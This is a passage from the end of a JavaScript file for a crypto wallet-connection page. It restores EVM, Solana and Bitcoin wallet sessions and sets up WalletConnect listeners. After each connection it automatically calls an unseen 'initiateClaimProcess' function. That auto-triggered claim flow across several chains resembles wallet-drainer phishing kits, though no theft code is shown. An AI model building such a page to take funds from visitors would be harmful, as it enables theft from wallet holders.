                  if (typeof window.initiateClaimProcess === 'function') {
                    window.initiateClaimProcess()
                  }
                }, 1000)
                return
              }
            }
          } catch (e) {
            logDebug(`Session restore after redirect failed: ${e.message}`)
          }
        }
      }
      sessionStorage.removeItem('pending_wc_uri')
      sessionStorage.removeItem('pending_wc_timestamp')
    }

    if (savedWallet && savedChain !== 'unknown') {
      logDebug(`♻️ Restoring ${savedChain} wallet: ${savedWallet}`)

      if (savedChain === 'evm') {
        if (savedSession) {
          const initSuccess = await initWalletConnect(false)
          if (initSuccess) {
            try {
              const session = client.session.get(savedSession.topic)
              if (session) {
                currentSession = session
                updateConnectedUI(savedWallet, 'evm')
                return
              }
            } catch (e) { logDebug(`Session restore failed: ${e.message}`) }
          }
        }
        // Try direct provider (desktop only)
        if (isDesktop() && window.ethereum) {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(() => [])
          if (accounts.length > 0 && accounts[0] === savedWallet) {
            updateConnectedUI(savedWallet, 'evm')
            return
          }
        }
        // If on mobile and no session, clear saved wallet
        if (isMobile()) {
          clearSavedWallet()
        }
      } else if (savedChain === 'solana') {
        if (isDesktop() && window.solana && window.solana.publicKey) {
          const addr = window.solana.publicKey.toString()
          if (addr === savedWallet) {
            updateConnectedUI(savedWallet, 'solana')
            window.solanaPublicKey = addr
            window.solanaProvider = window.solana
            return
          }
        }
        if (isDesktop()) {
          const success = await connectSolana()
          if (success) return
        }
        clearSavedWallet()
      } else if (savedChain === 'bitcoin') {
        if (isDesktop() && window.unisat) {
          try {
            const accounts = await window.unisat.getAccounts()
            if (accounts.length > 0 && accounts[0] === savedWallet) {
              updateConnectedUI(savedWallet, 'bitcoin')
              return
            }
          } catch (e) {}
        }
        clearSavedWallet()
      }
    }
  }

  // ============================================================
  //  LOAD LIBRARIES AND START
  //  ============================================================
  try {
    const libs = await loadWalletConnect()
    SignClient = libs.SignClient
    WalletConnectModal = libs.WalletConnectModal
    logDebug('✅ WalletConnect libraries loaded successfully')

    setupEIP6963()

    await restoreWalletConnection()
  } catch (err) {
    logDebug(`❌ Fatal error loading libraries: ${err.message}`)
    showStatus('Failed to load wallet libraries', 'error')
    return
  }

  // ============================================================
  //  SESSION LISTENERS (EVM)
  //  ============================================================
  setTimeout(() => {
    if (client) {
      client.on('session_update', ({ params }) => {
        const accounts = params.namespaces?.eip155?.accounts
        if (accounts?.length) {
          const account = accounts[0].split(':')[2]
          updateConnectedUI(account, 'evm')
          saveWallet(account, currentSession, 'evm')
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess()
            }
          }, 1000)
        }
      })
      client.on('session_delete', () => {
        resetConnectedUI()
        clearSavedWallet()
        showStatus('Wallet disconnected by provider', 'error')
      })
      client.on('session_connect', (session) => {
        const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2]
        if (account) {
          saveWallet(account, session, 'evm')
          updateConnectedUI(account, 'evm')
          currentSession = session
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess()
            }
          }, 1000)
        }
      })
    }
  }, 1000)

  // ============================================================
  //  GLOBAL EVM PROVIDER EVENTS (if already set up)
  //  ============================================================
  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum)
  }

  // ============================================================
  //  VISIBILITY CHANGE – check for session return
  //  ============================================================
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && getSavedWallet()) {
      logDebug('Page visible, checking connection...')
      const pendingUri = sessionStorage.getItem('pending_wc_uri')
      const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp')
      if (pendingUri && pendingTimestamp) {
        const elapsed = Date.now() - parseInt(pendingTimestamp)
        if (elapsed < 120000 && client) {
          logDebug('Visibility change: checking for pending session...')
          setTimeout(async () => {
            try {
              const sessions = client.session.values()
              if (sessions.length > 0) {
                const session = sessions[0]
                const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2]
                if (account) {
                  saveWallet(account, session, 'evm')
                  updateConnectedUI(account, 'evm')
                  currentSession = session
                  sessionStorage.removeItem('pending_wc_uri')
                  sessionStorage.removeItem('pending_wc_timestamp')
                  setTimeout(() => {
                    if (typeof window.initiateClaimProcess === 'function') {
                      window.initiateClaimProcess()
                    }
                  }, 1000)
                }
              }
            } catch (e) {
              logDebug(`Visibility check session restore failed: ${e.message}`)
            }
          }, 1000)
        }
      }
    }
  })

  // ============================================================
  //  CLEANUP
  //  ============================================================
  window.addEventListener('beforeunload', () => {
    if (modal) modal.closeModal()
  })

  logDebug(`✅ main.js enhanced version loaded`)
  logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`)
  logDebug(`   Connection flow: ${isMobile() ? 'WalletConnect only' : 'Direct EVM (prioritized) → WalletConnect → Solana → Bitcoin'}`)
})();
